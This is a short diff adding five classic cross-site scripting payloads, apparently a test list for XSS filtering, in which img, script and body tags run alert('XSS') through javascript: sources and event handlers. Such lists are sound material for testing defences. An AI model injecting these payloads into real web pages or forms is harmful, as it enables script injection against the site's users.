@@ -1,0 +1,5 @@
+<IMG SRC=`javascript:alert('XSS')`>
+<IMG SRC=# onmouseover="alert('XSS')">
+<IMG SRC= onmouseover="alert('XSS')">
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+<BODY ONLOAD=alert('XSS')>
